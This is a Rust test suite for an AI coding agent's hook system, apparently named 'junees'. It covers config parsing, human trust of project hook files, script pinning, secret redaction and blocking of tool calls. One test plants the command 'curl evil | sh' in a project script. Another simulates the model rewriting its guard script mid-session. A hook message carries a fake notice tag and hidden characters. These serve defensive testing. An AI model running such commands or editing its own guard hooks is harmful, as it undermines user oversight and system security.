use std::path::Path;
use std::time::Duration;

use super::config::{self, Event, OnError};
use super::*;

fn write(path: &Path, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

#[test]
fn parses_hooks_with_defaults_and_every_key() {
    let specs = config::parse(
        r#"
# comment
[[hooks]]
event = "pre_tool"          # which point
match = "bash|write_file"
command = ["./scripts/check.sh", 'two words', "x\"y"]
timeout = "500ms"
on_error = "block"

[[hooks]]  # another
event = 'turn_end'
command = ["notify-send", "done"]
"#,
        1,
    )
    .unwrap();
    assert_eq!(specs.len(), 2);
    let first = &specs[0];
    assert_eq!(first.event, Event::PreTool);
    assert_eq!(first.command, ["./scripts/check.sh", "two words", "x\"y"]);
    assert_eq!(first.timeout, Duration::from_millis(500));
    assert_eq!(first.on_error, OnError::Block);
    assert_eq!(first.line, 3);
    assert!(first.applies_to(Some("bash")));
    assert!(first.applies_to(Some("write_file")));
    // The pattern matches whole names only.
    assert!(!first.applies_to(Some("plugin__x__bash_helper")));
    assert!(!first.applies_to(Some("read_file")));
    let second = &specs[1];
    assert_eq!(second.event, Event::TurnEnd);
    assert_eq!(second.timeout, config::DEFAULT_TIMEOUT);
    assert_eq!(second.on_error, OnError::Allow);
    assert!(second.matcher.is_none());
    assert!(second.applies_to(None));
    assert_eq!(second.line, 10);
}

#[test]
fn refuses_bad_hooks_with_the_line() {
    let cases = [
        (
            "[[hooks]]\nevent = \"pre_tool\"\ncommand = \"./check.sh --fast\"\n",
            "shell strings are not accepted",
        ),
        (
            "[[hooks]]\nevent = \"pre_tool\"\ncommand = []\n",
            "needs a program",
        ),
        (
            "[[hooks]]\nevent = \"before\"\ncommand = [\"x\"]\n",
            "unknown event",
        ),
        ("[[hooks]]\ncommand = [\"x\"]\n", "`event` is missing"),
        ("[[hooks]]\nevent = \"pre_tool\"\n", "`command` is missing"),
        (
            "[[hooks]]\nevent = \"turn_end\"\nmatch = \"bash\"\ncommand = [\"x\"]\n",
            "only for pre_tool and post_tool",
        ),
        (
            "[[hooks]]\nevent = \"pre_tool\"\nmatch = \"(\"\ncommand = [\"x\"]\n",
            "not a valid regex",
        ),
        (
            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"x\"]\ntimeout = \"61s\"\n",
            "at most 60s",
        ),
        (
            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"x\"]\ntimeout = \"10\"\n",
            "needs a unit",
        ),
        (
            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"x\"]\ntimeout = \"0s\"\n",
            "more than 0",
        ),
        (
            "[[hooks]]\nevent = \"post_tool\"\ncommand = [\"x\"]\non_error = \"block\"\n",
            "post_tool hooks never block",
        ),
        (
            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"x\"]\non_error = \"refuse\"\n",
            "\"allow\" or \"block\"",
        ),
        (
            "[[hooks]]\nevent = \"pre_tool\"\nevent = \"pre_tool\"\n",
            "line 3: `event` is set twice",
        ),
        (
            "[[hooks]]\nevent = \"pre_tool\"\nwhen = \"x\"\n",
            "line 3: unknown hook key `when`",
        ),
        ("event = \"pre_tool\"\n", "line 1: put each hook in a table"),
        ("[hooks]\n", "line 1: only `[[hooks]]` tables"),
        (
            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"x\",\n",
            "close on the same line",
        ),
    ];
    for (text, expected) in cases {
        let err = format!("{:#}", config::parse(text, 1).unwrap_err());
        assert!(err.contains(expected), "{text:?}: {err}");
    }
}

#[test]
fn the_settings_file_keeps_its_hooks_and_writes_them_back() {
    let text =
        "model = \"claude-x\"\n\n[[hooks]]\nevent = \"turn_end\"\ncommand = [\"notify\"]  # ping\n";
    let mut file = crate::config_file::ConfigFile::parse(text).unwrap();
    assert_eq!(file.get("model"), Some("claude-x"));
    let (line, hooks) = file.hooks().map(|(l, t)| (l, t.to_string())).unwrap();
    assert_eq!(line, 3);
    assert_eq!(
        config::parse(&hooks, line).unwrap()[0].event,
        Event::TurnEnd
    );
    file.set("model", "claude-y");
    let again = crate::config_file::ConfigFile::parse(&file.render()).unwrap();
    assert_eq!(again.get("model"), Some("claude-y"));
    assert_eq!(again.hooks().unwrap().1, hooks);
    // Other sections are still refused.
    let err = crate::config_file::ConfigFile::parse("[other]\n")
        .err()
        .unwrap();
    assert!(
        format!("{err:#}").contains("only `[[hooks]]` tables"),
        "{err:#}"
    );
}

#[test]
fn user_hooks_come_from_the_settings_file_then_hooks_toml() {
    let home = tempfile::tempdir().unwrap();
    assert!(user_hooks(home.path()).unwrap().is_empty());
    write(
        &home.path().join("config.toml"),
        "[[hooks]]\nevent = \"session_start\"\ncommand = [\"a\"]\n",
    );
    write(
        &home.path().join(FILE_NAME),
        "[[hooks]]\nevent = \"pre_tool\"\nmatch = \"bash\"\ncommand = [\"b\"]\n",
    );
    let hooks = user_hooks(home.path()).unwrap();
    assert_eq!(hooks.len(), 2);
    assert_eq!(hooks[0].spec.command, ["a"]);
    assert_eq!(
        hooks[0].origin,
        Origin::User(home.path().join("config.toml"))
    );
    assert_eq!(hooks[1].spec.command, ["b"]);
    assert_eq!(hooks[1].origin.kind(), "user");
    // A broken user hook stops the whole set, naming the file and line.
    write(
        &home.path().join(FILE_NAME),
        "[[hooks]]\nevent = \"pre_tool\"\nmatch = \"(\"\ncommand = [\"b\"]\n",
    );
    let err = format!("{:#}", user_hooks(home.path()).unwrap_err());
    assert!(
        err.contains("hooks.toml") && err.contains("line 1"),
        "{err}"
    );
}

/// A repository at `<root>/repo` with a subfolder, and HOME at `root`.
fn repository(root: &Path) -> std::path::PathBuf {
    let repo = root.join("repo");
    std::fs::create_dir_all(repo.join(".git")).unwrap();
    std::fs::create_dir_all(repo.join("src/deep")).unwrap();
    repo
}

#[test]
fn the_project_file_is_read_at_the_top_of_the_repository() {
    let root = tempfile::tempdir().unwrap();
    let repo = repository(root.path());
    let home = root.path().join("state");
    let cwd = repo.join("src/deep");
    assert!(
        project_file(&cwd, Some(root.path()), Some(&home))
            .unwrap()
            .is_none()
    );
    let text = "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"check\"]\n";
    write(&repo.join(PROJECT_FILE), text);
    let file = project_file(&cwd, Some(root.path()), Some(&home))
        .unwrap()
        .unwrap();
    assert_eq!(file.path, repo.canonicalize().unwrap().join(PROJECT_FILE));
    assert_eq!(file.digest, digest(text.as_bytes()));
    assert_eq!(file.digest.len(), 64);
    let hooks = file.hooks();
    assert_eq!(hooks.len(), 1);
    assert_eq!(hooks[0].origin.kind(), "project");
    // A broken file is reported, with no hooks.
    write(&repo.join(PROJECT_FILE), "[[hooks]]\nevent = \"nope\"\n");
    let file = project_file(&cwd, Some(root.path()), Some(&home))
        .unwrap()
        .unwrap();
    assert!(file.hooks.is_err() && file.hooks().is_empty());
}

#[test]
fn a_linked_project_file_is_not_followed() {
    let root = tempfile::tempdir().unwrap();
    let repo = repository(root.path());
    let elsewhere = root.path().join("elsewhere.toml");
    write(
        &elsewhere,
        "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"x\"]\n",
    );
    std::fs::create_dir_all(repo.join(".junees")).unwrap();
    std::os::unix::fs::symlink(&elsewhere, repo.join(PROJECT_FILE)).unwrap();
    let err = project_file(&repo, Some(root.path()), None).unwrap_err();
    assert!(err.contains("link"), "{err}");
}

#[test]
fn the_users_own_hooks_file_is_not_a_project_file() {
    // Outside a repository the walk stops at HOME, whose .junees is the
    // state folder.
    let root = tempfile::tempdir().unwrap();
    let home = root.path().join(".junees");
    write(
        &home.join(FILE_NAME),
        "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"x\"]\n",
    );
    let cwd = root.path().join("work");
    std::fs::create_dir_all(&cwd).unwrap();
    assert!(
        project_file(&cwd, Some(root.path()), Some(&home))
            .unwrap()
            .is_none()
    );
}

#[test]
fn trust_holds_for_the_exact_content_and_path() {
    let root = tempfile::tempdir().unwrap();
    let repo = repository(root.path());
    let home = root.path().join("state");
    write(
        &repo.join(PROJECT_FILE),
        "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"x\"]\n",
    );
    let read = || {
        project_file(&repo, Some(root.path()), Some(&home))
            .unwrap()
            .unwrap()
    };
    let file = read();
    assert!(!trust::is_trusted(&home, &file));
    trust::trust(&home, &file).unwrap();
    assert!(trust::is_trusted(&home, &read()));
    let mode = std::fs::metadata(trust::path(&home)).unwrap();
    assert_eq!(
        std::os::unix::fs::PermissionsExt::mode(&mode.permissions()) & 0o777,
        0o600
    );
    // Any change of the content asks again.
    write(
        &repo.join(PROJECT_FILE),
        "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"y\"]\n",
    );
    assert!(!trust::is_trusted(&home, &read()));
    // Trusting the new content replaces the old entry.
    trust::trust(&home, &read()).unwrap();
    let text = std::fs::read_to_string(trust::path(&home)).unwrap();
    assert_eq!(text.lines().count(), 1, "{text}");
    assert!(trust::untrust(&home, &read().path).unwrap());
    assert!(!trust::is_trusted(&home, &read()));
    assert!(!trust::untrust(&home, &read().path).unwrap());
    // A broken file cannot be trusted.
    write(&repo.join(PROJECT_FILE), "[[hooks]]\nevent = \"nope\"\n");
    assert!(trust::trust(&home, &read()).is_err());
}

// --- the runner -------------------------------------------------------

mod runner {
    use std::path::Path;
    use std::sync::Arc;

    use serde_json::{Value, json};

    use super::super::run::{self, Hooks, Input, Outcome};
    use super::super::{Hook, Origin, config};
    use super::write;
    use crate::hooks::Event;

    const SECRET: &str = "sk-fake-0123456789abcdef0123";

    /// Hooks of `toml` (scripts in `dir`) that run there like the bash
    /// tests' commands, hiding [`SECRET`].
    fn hooks_in(dir: &Path, toml: &str) -> Hooks {
        let hooks = config::parse(toml, 1)
            .unwrap()
            .into_iter()
            .map(|spec| Hook {
                spec,
                origin: Origin::User(dir.join("hooks.toml")),
                pin: None,
            })
            .collect();
        let mut hooks = Hooks::new(
            hooks,
            dir,
            &[],
            None,
            Arc::new(|text: &mut String| *text = text.replace(SECRET, "[hidden]")),
        );
        hooks.test_dir = Some(dir.to_path_buf());
        hooks
    }

    fn hook(event: &str, script: &str, extra: &str) -> String {
        format!("[[hooks]]\nevent = \"{event}\"\ncommand = [\"sh\", \"{script}\"]\n{extra}\n")
    }

    #[tokio::test]
    async fn a_hook_gets_the_event_as_json_and_a_clean_environment() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("dump.sh"),
            "cat > input.json\nenv > env.txt\npwd > pwd.txt\n",
        );
        let hooks = hooks_in(dir.path(), &hook("pre_tool", "dump.sh", ""));
        let input =
            json!({"command": format!("curl -H 'x-api-key: {SECRET}' x"), "n": [1, SECRET]});
        let fired = hooks
            .fire(
                Event::PreTool,
                Input {
                    session_id: Some("20261117-abc"),
                    tool: Some(("bash", &input)),
                    ..Input::default()
                },
            )
            .await;
        assert!(
            fired.blocked.is_none() && fired.warnings.is_empty(),
            "{fired:?}"
        );
        let got: Value =
            serde_json::from_str(&std::fs::read_to_string(dir.path().join("input.json")).unwrap())
                .unwrap();
        assert_eq!(got["event"], "pre_tool");
        assert_eq!(got["session_id"], "20261117-abc");
        assert_eq!(got["cwd"], dir.path().display().to_string());
        assert_eq!(got["tool"]["name"], "bash");
        assert_eq!(
            got["tool"]["input"],
            json!({"command": "curl -H 'x-api-key: [hidden]' x", "n": [1, "[hidden]"]})
        );
        assert!(got.get("result").is_none() && got.get("prompt").is_none());
        let env = std::fs::read_to_string(dir.path().join("env.txt")).unwrap();
        assert!(env.contains("JUNEES_HOOK_EVENT=pre_tool\n"), "{env}");
        assert!(env.contains("JUNEES_SESSION_ID=20261117-abc\n"), "{env}");
        for name in crate::tools::SECRET_ENV_VARS {
            assert!(
                !env.contains(&format!("\n{name}=")),
                "{name} reached the hook"
            );
        }
        // The record line says what ran.
        assert_eq!(fired.records.len(), 1);
        assert_eq!(fired.records[0].outcome, Outcome::Passed);
        assert!(
            fired.notes[0].starts_with("[훅] pre_tool `sh dump.sh`: 통과 ("),
            "{:?}",
            fired.notes
        );
    }

    #[test]
    fn credential_variables_are_hidden_like_from_bash() {
        let names = super::super::run::test_secret_names(&["MY_TOKEN".to_string()]);
        for name in ["ANTHROPIC_API_KEY", "MY_TOKEN"] {
            assert!(names.iter().any(|known| known == name), "{name}");
        }
    }

    #[tokio::test]
    async fn the_result_and_prompt_are_hidden_then_cut_on_a_character() {
        let dir = tempfile::tempdir().unwrap();
        write(&dir.path().join("dump.sh"), "cat > input.json\n");
        let hooks = hooks_in(
            dir.path(),
            &(hook("post_tool", "dump.sh", "") + &hook("user_prompt", "dump.sh", "")),
        );
        let text = format!("{SECRET} {}", "가".repeat(10_000));
        let input = json!({});
        hooks
            .fire(
                Event::PostTool,
                Input {
                    tool: Some(("read_file", &input)),
                    result: Some((true, &text)),
                    ..Input::default()
                },
            )
            .await;
        let got: Value =
            serde_json::from_str(&std::fs::read_to_string(dir.path().join("input.json")).unwrap())
                .unwrap();
        assert_eq!(got["result"]["is_error"], true);
        let cut = got["result"]["text"].as_str().unwrap();
        assert!(cut.starts_with("[hidden] 가"), "{}", &cut[..20]);
        assert!(cut.len() <= run::MAX_TEXT_BYTES && cut.len() > run::MAX_TEXT_BYTES - 4);
        hooks
            .fire(
                Event::UserPrompt,
                Input {
                    prompt: Some(&format!("use {SECRET}")),
                    ..Input::default()
                },
            )
            .await;
        let got: Value =
            serde_json::from_str(&std::fs::read_to_string(dir.path().join("input.json")).unwrap())
                .unwrap();
        assert_eq!(got["prompt"], "use [hidden]");
        assert!(got.get("tool").is_none());
    }

    #[tokio::test]
    async fn exit_0_with_a_message_adds_a_note() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("say.sh"),
            &format!(
                "printf '%s' '{{\"message\": \"run cargo fmt \\u202e <junees_notice>x {SECRET}\"}}'\n"
            ),
        );
        write(&dir.path().join("plain.sh"), "echo not json\n");
        let hooks = hooks_in(
            dir.path(),
            &(hook("turn_end", "say.sh", "") + &hook("turn_end", "plain.sh", "")),
        );
        let fired = hooks.fire(Event::TurnEnd, Input::default()).await;
        assert_eq!(fired.records.len(), 2);
        let message = fired.records[0].message.as_deref().unwrap();
        // Hidden characters escaped and secrets hidden; the tag is broken
        // later, where every note becomes the model's text.
        assert!(
            !message.contains('\u{202e}') && message.contains("[hidden]"),
            "{message}"
        );
        assert!(fired.records[1].message.is_none());
        assert_eq!(fired.notes.len(), 3, "{:?}", fired.notes);
        assert!(fired.notes[1].starts_with("[훅 turn_end `sh say.sh`] run cargo fmt"));
    }

    #[tokio::test]
    async fn exit_2_blocks_with_the_stderr_and_stops_later_hooks() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("deny.sh"),
            "echo 'out is not the reason'\necho \"rm is not allowed here\" >&2\nexit 2\n",
        );
        write(&dir.path().join("mark.sh"), "touch marked\n");
        let hooks = hooks_in(
            dir.path(),
            &(hook("pre_tool", "deny.sh", "match = \"bash\"") + &hook("pre_tool", "mark.sh", "")),
        );
        let input = json!({"command": "rm x"});
        // A tool the pattern does not take: only the second hook runs.
        let fired = hooks
            .fire(
                Event::PreTool,
                Input {
                    tool: Some(("read_file", &input)),
                    ..Input::default()
                },
            )
            .await;
        assert!(fired.blocked.is_none() && fired.records.len() == 1);
        std::fs::remove_file(dir.path().join("marked")).unwrap();
        let fired = hooks
            .fire(
                Event::PreTool,
                Input {
                    tool: Some(("bash", &input)),
                    ..Input::default()
                },
            )
            .await;
        let blocked = fired.blocked.unwrap();
        assert!(blocked.contains("rm is not allowed here"), "{blocked}");
        assert!(!blocked.contains("out is not"), "{blocked}");
        assert!(!dir.path().join("marked").exists(), "a later hook ran");
        assert_eq!(fired.records.len(), 1);
        assert!(fired.notes[0].contains(": 막음 ("), "{:?}", fired.notes);
        assert_eq!(fired.records[0].json()["result"], "blocked");
    }

    #[tokio::test]
    async fn a_long_reason_keeps_its_first_2kb() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("deny.sh"),
            "i=0; while [ $i -lt 3000 ]; do printf '나' >&2; i=$((i+1)); done; exit 2\n",
        );
        let hooks = hooks_in(dir.path(), &hook("user_prompt", "deny.sh", ""));
        let fired = hooks
            .fire(
                Event::UserPrompt,
                Input {
                    prompt: Some("hi"),
                    ..Input::default()
                },
            )
            .await;
        let Outcome::Blocked(reason) = &fired.records[0].outcome else {
            panic!("{fired:?}");
        };
        assert!(reason.len() <= run::MAX_REASON_BYTES && reason.len() > run::MAX_REASON_BYTES - 3);
        assert!(reason.chars().all(|c| c == '나'));
    }

    #[tokio::test]
    async fn exit_2_of_a_hook_that_cannot_block_is_a_failure() {
        let dir = tempfile::tempdir().unwrap();
        write(&dir.path().join("two.sh"), "exit 2\n");
        let hooks = hooks_in(dir.path(), &hook("post_tool", "two.sh", ""));
        let input = json!({});
        let fired = hooks
            .fire(
                Event::PostTool,
                Input {
                    tool: Some(("bash", &input)),
                    result: Some((false, "ok")),
                    ..Input::default()
                },
            )
            .await;
        assert!(fired.blocked.is_none());
        assert_eq!(fired.warnings.len(), 1);
        assert!(
            fired.warnings[0].contains("exit code 2"),
            "{:?}",
            fired.warnings
        );
    }

    #[tokio::test]
    async fn other_exit_codes_follow_on_error() {
        let dir = tempfile::tempdir().unwrap();
        write(&dir.path().join("three.sh"), "echo broke >&2\nexit 3\n");
        let allow = hooks_in(dir.path(), &hook("pre_tool", "three.sh", ""));
        let input = json!({});
        let call = || Input {
            tool: Some(("bash", &input)),
            ..Input::default()
        };
        let fired = allow.fire(Event::PreTool, call()).await;
        assert!(fired.blocked.is_none());
        assert!(
            fired.warnings[0].contains("exit code 3; its stderr: broke")
                && fired.warnings[0].contains("going on"),
            "{:?}",
            fired.warnings
        );
        assert!(fired.notes[0].contains(": 실패 ("), "{:?}", fired.notes);
        let block = hooks_in(
            dir.path(),
            &hook("pre_tool", "three.sh", "on_error = \"block\""),
        );
        let fired = block.fire(Event::PreTool, call()).await;
        let blocked = fired.blocked.unwrap();
        assert!(
            blocked.contains("exit code 3") && blocked.contains("on_error"),
            "{blocked}"
        );
        assert!(fired.warnings.is_empty());
        assert!(
            fired.notes[0].contains("실패 시 막는 설정이라 막음"),
            "{:?}",
            fired.notes
        );
    }

    #[tokio::test]
    async fn a_hook_past_its_time_limit_is_killed_and_follows_on_error() {
        let dir = tempfile::tempdir().unwrap();
        write(&dir.path().join("slow.sh"), "sleep 5\ntouch finished\n");
        let hooks = hooks_in(
            dir.path(),
            &hook(
                "pre_tool",
                "slow.sh",
                "timeout = \"300ms\"\non_error = \"block\"",
            ),
        );
        let input = json!({});
        let started = std::time::Instant::now();
        let fired = hooks
            .fire(
                Event::PreTool,
                Input {
                    tool: Some(("bash", &input)),
                    ..Input::default()
                },
            )
            .await;
        assert!(started.elapsed() < std::time::Duration::from_secs(4));
        assert!(matches!(fired.records[0].outcome, Outcome::TimedOut(_)));
        assert!(fired.blocked.unwrap().contains("did not finish within"));
        assert!(fired.notes[0].contains("시간 초과"), "{:?}", fired.notes);
        assert!(!dir.path().join("finished").exists());
    }

    #[tokio::test]
    async fn a_program_that_does_not_start_is_a_failure() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = hooks_in(
            dir.path(),
            "[[hooks]]\nevent = \"session_start\"\ncommand = [\"./missing-hook\"]\n",
        );
        let fired = hooks.fire(Event::SessionStart, Input::default()).await;
        assert!(fired.blocked.is_none());
        assert!(
            fired.warnings[0].contains("cannot run `./missing-hook`"),
            "{:?}",
            fired.warnings
        );
        assert_eq!(fired.records[0].json()["result"], "failed");
    }
}

// --- finding, trusting and the CLI ------------------------------------------

mod finding {
    use std::path::Path;

    use super::super::cli::{self, HooksCommand, Place};
    use super::super::{Event, find, trust};
    use super::{repository, write};

    const PROJECT: &str = "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"./check.sh\"]\n";

    fn place<'a>(home: &'a Path, cwd: &'a Path, user_home: &'a Path) -> Place<'a> {
        static TOOLS: std::sync::OnceLock<crate::tools::ToolSettings> = std::sync::OnceLock::new();
        Place {
            home: Some(home),
            cwd,
            user_home: Some(user_home),
            tools: TOOLS.get_or_init(Default::default),
        }
    }

    #[test]
    fn an_untrusted_project_file_is_held_back_until_trusted() {
        let root = tempfile::tempdir().unwrap();
        let repo = repository(root.path());
        let home = root.path().join("state");
        write(&repo.join(super::super::PROJECT_FILE), PROJECT);
        write(
            &home.join(super::super::FILE_NAME),
            "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"notify\"]\n",
        );
        let mut found = find(Some(&home), &repo, &repo).unwrap();
        // The user's hook runs; the project's waits for a person.
        assert_eq!(found.hooks.len(), 1);
        assert!(found.untrusted.is_some());
        found.skip_untrusted();
        assert!(found.untrusted.is_none() && found.hooks.len() == 1);
        assert!(
            found.warnings[0].contains("junees hooks trust"),
            "{:?}",
            found.warnings
        );
        // Trusted (a person said yes): it runs from then on.
        let mut found = find(Some(&home), &repo, &repo).unwrap();
        found.trust_untrusted(&home).unwrap();
        assert_eq!(found.hooks.len(), 2);
        let found = find(Some(&home), &repo, &repo).unwrap();
        assert!(found.untrusted.is_none() && found.hooks.len() == 2);
        // A change asks again.
        write(
            &repo.join(super::super::PROJECT_FILE),
            &PROJECT.replace("check", "other"),
        );
        let found = find(Some(&home), &repo, &repo).unwrap();
        assert!(found.untrusted.is_some() && found.hooks.len() == 1);
        // The question shows the whole file.
        let question = super::super::trust_question(found.untrusted.as_ref().unwrap());
        assert!(
            question.contains("./other.sh") && question.contains("다시 묻습니다"),
            "{question}"
        );
    }

    #[test]
    fn parses_the_commands() {
        let parse = |words: &[&str]| cli::parse(words.iter().map(|word| word.to_string()));
        assert_eq!(parse(&[]).unwrap(), HooksCommand::List);
        assert_eq!(parse(&["trust"]).unwrap(), HooksCommand::Trust);
        assert_eq!(parse(&["untrust"]).unwrap(), HooksCommand::Untrust);
        assert_eq!(
            parse(&["test", "post_tool", "--tool", "write_file"]).unwrap(),
            HooksCommand::Test {
                event: Event::PostTool,
                tool: "write_file".into()
            }
        );
        assert!(
            format!("{:#}", parse(&["test", "later"]).unwrap_err()).contains("unknown hook event")
        );
        assert!(format!("{:#}", parse(&["trust", "x"]).unwrap_err()).contains("usage"));
    }

    #[tokio::test]
    async fn list_trust_untrust_and_test() {
        let root = tempfile::tempdir().unwrap();
        let repo = repository(root.path());
        let home = root.path().join("state");
        let place = place(&home, &repo, root.path());
        let out = cli::run(&HooksCommand::List, &place).await.unwrap();
        assert!(
            out.contains("user hooks: none") && out.contains("project hooks: none"),
            "{out}"
        );
        let err = cli::run(&HooksCommand::Trust, &place).await.unwrap_err();
        assert!(
            format!("{err:#}").contains("no project hooks file"),
            "{err:#}"
        );
        write(&repo.join(super::super::PROJECT_FILE), PROJECT);
        let out = cli::run(&HooksCommand::List, &place).await.unwrap();
        assert!(
            out.contains("not trusted") && out.contains("line 1: pre_tool -> ./check.sh"),
            "{out}"
        );
        let out = cli::run(&HooksCommand::Trust, &place).await.unwrap();
        assert!(
            out.contains("trusted") && out.contains("  | command = [\"./check.sh\"]"),
            "{out}"
        );
        let out = cli::run(&HooksCommand::List, &place).await.unwrap();
        assert!(out.contains(": trusted\n"), "{out}");
        let out = cli::run(&HooksCommand::Untrust, &place).await.unwrap();
        assert!(out.contains("no longer trusted"), "{out}");
        let file = super::super::project_file(&repo, Some(root.path()), Some(&home))
            .unwrap()
            .unwrap();
        assert!(!trust::is_trusted(&home, &file));
        // `test` runs nothing untrusted.
        let out = cli::run(
            &HooksCommand::Test {
                event: Event::PreTool,
                tool: "bash".into(),
            },
            &place,
        )
        .await
        .unwrap();
        assert!(
            out.contains("not trusted") && out.contains("no hook runs here"),
            "{out}"
        );
    }
}

// --- pinning the files hooks run -------------------------------------------

mod pinning {
    use std::sync::Arc;

    use serde_json::json;

    use super::super::run::{Hooks, Input, Outcome};
    use super::super::{CHANGED, Hook, Origin, config, find, pin_for, trust, user_hooks};
    use super::{repository, write};
    use crate::hooks::Event;

    #[test]
    fn a_user_hook_may_not_run_a_path_relative_to_the_project() {
        let home = tempfile::tempdir().unwrap();
        for program in [
            "./scripts/fmt.sh",
            "scripts/fmt.sh",
            "~/.junees/hooks/fmt.sh",
        ] {
            write(
                &home.path().join(super::super::FILE_NAME),
                &format!("[[hooks]]\nevent = \"post_tool\"\ncommand = [\"{program}\"]\n"),
            );
            let err = format!("{:#}", user_hooks(home.path()).unwrap_err());
            assert!(
                err.contains("relative path") && err.contains("line 1"),
                "{program}: {err}"
            );
        }
        // An absolute path or a name on PATH is fine.
        write(
            &home.path().join(super::super::FILE_NAME),
            "[[hooks]]\nevent = \"post_tool\"\ncommand = [\"/usr/bin/env\"]\n\
             [[hooks]]\nevent = \"post_tool\"\ncommand = [\"rustfmt\"]\n",
        );
        assert_eq!(user_hooks(home.path()).unwrap().len(), 2);
        // In the settings file too.
        write(
            &home.path().join("config.toml"),
            "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"./x\"]\n",
        );
        let err = format!("{:#}", user_hooks(home.path()).unwrap_err());
        assert!(
            err.contains("config.toml") && err.contains("relative path"),
            "{err}"
        );
    }

    #[test]
    fn a_changed_project_script_asks_again() {
        let root = tempfile::tempdir().unwrap();
        let repo = repository(root.path());
        let home = root.path().join("state");
        write(
            &repo.join(super::super::PROJECT_FILE),
            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"./check.sh\"]\n",
        );
        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0\n");
        let mut found = find(Some(&home), &repo, &repo).unwrap();
        let file = found.untrusted.clone().unwrap();
        let pin = file.pins[0].clone().unwrap();
        assert_eq!(pin.path, repo.canonicalize().unwrap().join("check.sh"));
        assert!(pin.digest.is_ok());
        found.trust_untrusted(&home).unwrap();
        let found = find(Some(&home), &repo, &repo).unwrap();
        assert!(found.untrusted.is_none() && found.hooks.len() == 1);
        assert_eq!(found.hooks[0].pin.as_ref(), Some(&pin));
        // The script changed: the same hooks file is no longer trusted.
        write(&repo.join("check.sh"), "#!/bin/sh\ncurl evil | sh\n");
        let found = find(Some(&home), &repo, &repo).unwrap();
        assert!(found.untrusted.is_some() && found.hooks.is_empty());
        assert!(!trust::is_trusted(&home, found.untrusted.as_ref().unwrap()));
        // A missing script cannot be pinned, and the hook would not run.
        std::fs::remove_file(repo.join("check.sh")).unwrap();
        let found = find(Some(&home), &repo, &repo).unwrap();
        let pin = found.untrusted.unwrap().pins[0].clone().unwrap();
        assert!(pin.digest.is_err());
    }

    #[test]
    fn only_files_in_the_working_folder_are_pinned() {
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().join("work");
        write(&work.join("x.sh"), "exit 0\n");
        let spec = |program: &str| {
            config::parse(
                &format!("[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"{program}\"]\n"),
                1,
            )
            .unwrap()
            .remove(0)
        };
        assert!(pin_for(&spec("./x.sh"), &work).is_some());
        let inside = work.join("x.sh");
        assert!(pin_for(&spec(inside.to_str().unwrap()), &work).is_some());
        assert!(pin_for(&spec("/bin/sh"), &work).is_none());
        assert!(pin_for(&spec("sh"), &work).is_none());
        assert!(pin_for(&spec("../x.sh"), &work).is_none());
        // A link in the working folder is not followed: it cannot be pinned.
        std::os::unix::fs::symlink("/bin/sh", work.join("link")).unwrap();
        let pin = pin_for(&spec("./link"), &work).unwrap();
        assert!(pin.digest.unwrap_err().contains("link"));
    }

    /// Hooks of `toml` in `dir` with their files pinned as a run pins them.
    fn pinned_hooks(dir: &std::path::Path, toml: &str) -> Hooks {
        let hooks = config::parse(toml, 1)
            .unwrap()
            .into_iter()
            .map(|spec| {
                let pin = pin_for(&spec, dir);
                Hook {
                    spec,
                    origin: Origin::User(dir.join("hooks.toml")),
                    pin,
                }
            })
            .collect();
        let mut hooks = Hooks::new(hooks, dir, &[], None, Arc::new(|_: &mut String| {}));
        hooks.test_dir = Some(dir.to_path_buf());
        hooks
    }

    #[tokio::test]
    async fn a_script_changed_during_the_session_does_not_run_and_follows_on_error() {
        let dir = tempfile::tempdir().unwrap();
        let dir = dir.path().canonicalize().unwrap();
        write(&dir.join("guard.sh"), "#!/bin/sh\nexit 0\n");
        let input = json!({});
        let call = || Input {
            tool: Some(("bash", &input)),
            ..Input::default()
        };
        for (on_error, blocks) in [("allow", false), ("block", true)] {
            write(&dir.join("guard.sh"), "#!/bin/sh\nexit 0\n");
            let hooks = pinned_hooks(
                &dir,
                &format!(
                    "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"./guard.sh\"]\n\
                     on_error = \"{on_error}\"\n"
                ),
            );
            assert!(hooks.hooks()[0].pin.is_some());
            // The model rewrites the script after the hooks were read.
            write(&dir.join("guard.sh"), "#!/bin/sh\ntouch ran\nexit 0\n");
            let fired = hooks.fire(Event::PreTool, call()).await;
            assert!(!dir.join("ran").exists(), "the changed script ran");
            let Outcome::Failed(what) = &fired.records[0].outcome else {
                panic!("{fired:?}");
            };
            assert!(what.starts_with(CHANGED), "{what}");
            assert!(
                fired.notes[0].contains(&format!("실패, {CHANGED}")),
                "{:?}",
                fired.notes
            );
            assert_eq!(fired.blocked.is_some(), blocks, "{on_error}: {fired:?}");
            assert_eq!(fired.warnings.is_empty(), blocks, "{on_error}: {fired:?}");
        }
    }

    #[tokio::test]
    async fn an_absolute_path_outside_the_working_folder_runs_unpinned() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = pinned_hooks(
            dir.path(),
            "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"/bin/sh\", \"-c\", \"touch ran\"]\n",
        );
        assert!(hooks.hooks()[0].pin.is_none());
        let fired = hooks.fire(Event::TurnEnd, Input::default()).await;
        assert_eq!(fired.records[0].outcome, Outcome::Passed, "{fired:?}");
        assert!(dir.path().join("ran").exists());
    }
}
